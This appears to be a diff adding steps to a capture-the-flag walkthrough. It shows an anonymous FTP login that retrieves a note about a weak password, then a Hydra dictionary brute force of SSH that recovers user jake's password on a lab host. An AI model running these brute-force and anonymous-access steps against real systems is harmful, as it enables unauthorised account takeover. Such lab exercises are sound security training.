@@ -46,4 +46,55 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
 </code></pre>
 
+<pre><code>
+$ ftp 10.10.250.221
+Connected to 10.10.250.221.
+220 (vsFTPd 3.0.3)
+Name (10.10.250.221:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp> get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.00 secs (55.6299 kB/s)
+ftp> bye
+221 Goodbye.
+</code></pre>
+
+<pre><code>
+$ cat note_to_jake.txt
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</code></pre>
+
+<pre><code>
+$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.250.221
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-10-30 03:56:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.10.250.221:22/
+[22][ssh] host: 10.10.250.221   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 16 targets did not complete
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-10-30 03:57:06
+</code></pre>
+
+
+
+
 
